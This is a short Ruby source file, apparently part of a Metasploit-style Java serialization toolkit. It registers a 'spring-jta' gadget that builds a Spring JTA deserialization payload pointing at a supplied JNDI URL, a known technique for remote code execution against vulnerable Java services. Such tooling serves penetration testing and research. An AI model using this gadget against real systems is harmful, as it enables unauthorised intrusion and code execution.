# -*- coding: binary -*-
require_relative '../../payloads/spring'

S=Rex::Java::Serialization 
class SpringJta < S::Generator::Gadget
  def id
    'spring-jta'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('spring-jta')
    return false if params.fetch('jndiurl', nil).nil?
    true
  end

  def create(ctx, params: {})
    ctx.reg.load('model/spring-4.json')
    if !params.fetch('jndiurl', nil).nil?
      S::Payloads::Spring.make_jta(params['jndiurl'])
    else
      raise 'Missing parameters'
    end
  end
end

S::Generator.register(
  SpringJta.new
)
